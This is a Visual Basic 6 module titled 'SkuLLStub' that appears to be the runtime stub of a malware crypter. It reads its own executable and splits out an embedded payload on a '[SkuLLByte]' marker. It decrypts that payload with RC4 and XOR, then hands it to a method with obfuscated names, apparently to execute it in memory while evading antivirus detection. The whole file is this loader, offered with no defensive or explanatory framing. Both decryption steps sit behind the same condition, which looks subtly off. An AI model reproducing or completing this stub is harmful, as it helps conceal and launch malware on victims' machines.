Attribute VB_Name = "SkuLLStub"
Option Explicit

Sub Main()

    Dim Free         As Long
    Dim Data         As String
    Dim Datos()      As String
    Dim hRC4         As New clsRC4
    Dim hXOR         As New clsXOR
    Dim JFSYERNVZHSADFY4535hhjsJGSDJSvMSC           As New Class2
    
Free = FreeFile

Open App.Path & "\" & App.EXEName & ".exe" For Binary As Free
    Data = Space$(LOF(1))
    Get #1, , Data
Close Free

Datos() = Split(Data, "[SkuLLByte]")

If Datos(4) = 3 Then Datos(1) = hRC4.DecryptString(Datos(1), Datos(3))
If Datos(4) = 3 Then Datos(1) = hXOR.DecryptString(Datos(1), Datos(3))

JFSYERNVZHSADFY4535hhjsJGSDJSvMSC.KSAUOIRUOQKCNAMJFYQiETPDHACNASR StrConv(Datos(1), vbFromUnicode), vbNullString

End Sub
